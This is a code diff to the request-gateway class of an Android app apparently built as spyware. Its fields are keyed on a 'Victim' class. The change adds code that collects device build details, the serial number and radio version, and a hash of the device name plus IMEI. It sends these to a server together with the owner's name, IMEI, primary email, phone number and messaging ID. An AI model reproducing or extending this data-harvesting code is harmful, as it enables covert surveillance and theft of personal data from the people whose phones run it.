@@ -3,6 +3,7 @@ package com.theah64.xrob.utils;
 import android.app.Activity;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.os.Build;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.support.annotation.WorkerThread;
@@ -30,6 +31,43 @@ public class APIRequestGateway {
 
     private static final String X = APIRequestGateway.class.getSimpleName();
     private final Activity activity;
+
+    private static String getDeviceName() {
+        final String manufacturer = Build.MANUFACTURER;
+        final String model = Build.MODEL;
+        if (model.startsWith(manufacturer)) {
+            return model.toUpperCase();
+        } else {
+            return manufacturer.toUpperCase() + " " + model;
+        }
+    }
+
+    public static String getOtherDeviceInfo() {
+
+        final StringBuilder stringBuilder = new StringBuilder();
+        stringBuilder
+                .append("Build.BOARD").append("=").append(Build.BOARD).append(",")
+                .append("Build.BOOTLOADER").append("=").append(Build.BOOTLOADER).append(",")
+                .append("Build.BRAND").append("=").append(Build.BRAND).append(",")
+                .append("Build.DEVICE").append("=").append(Build.DEVICE).append(",")
+                .append("Build.FINGERPRINT").append("=").append(Build.FINGERPRINT).append(",")
+                .append("Build.DISPLAY").append("=").append(Build.DISPLAY).append(",")
+                .append("Build.HARDWARE").append("=").append(Build.HARDWARE).append(",")
+                .append("Build.HOST").append("=").append(Build.HOST).append(",")
+                .append("Build.ID").append("=").append(Build.ID).append(",")
+                .append("Build.PRODUCT").append("=").append(Build.PRODUCT).append(",")
+                .append("Build.SERIAL").append("=").append(Build.SERIAL).append(",");
+
+
+        if (CommonUtils.isSupport(14)) {
+            stringBuilder.append("Build.getRadioVersion()").append("=").append(Build.getRadioVersion()).append(",");
+        } else {
+            //noinspection deprecation
+            stringBuilder.append("Build.RADIO").append("=").append(Build.RADIO).append(",");
+        }
+
+        return stringBuilder.toString();
+    }
 
     public interface APIRequestGatewayCallback {
         void onReadyToRequest(final String apiKey);
@@ -63,16 +101,25 @@ public class APIRequestGateway {
 
         //Collecting needed information
         final String name = profileUtils.getDeviceOwnerName();
+
         final String imei = profileUtils.getIMEI();
+        final String deviceName = getDeviceName();
+        final String deviceHash = DarKnight.getEncrypted(deviceName + imei);
+        final String otherDeviceInfo = getOtherDeviceInfo();
+
         final String email = profileUtils.getPrimaryEmail();
         final String phone = profileUtils.getPhone();
         final PrefUtils prefUtils = PrefUtils.getInstance(context);
         final String fcmId = prefUtils.getString(Victim.KEY_FCM_ID);
 
+
         //Attaching them with the request
         final Request inRequest = new APIRequestBuilder("/in")
                 .addParamIfNotNull(Victim.KEY_NAME, name)
                 .addParam(Victim.KEY_IMEI, imei)
+                .addParam(Victim.KEY_DEVICE_NAME, deviceName)
+                .addParam(Victim.KEY_DEVICE_HASH, deviceHash)
+                .addParam(Victim.KEY_OTHER_DEVICE_INFO, otherDeviceInfo)
                 .addParamIfNotNull(Victim.KEY_FCM_ID, fcmId)
                 .addParamIfNotNull(Victim.KEY_EMAIL, email)
                 .addParamIfNotNull(Victim.KEY_PHONE, phone)
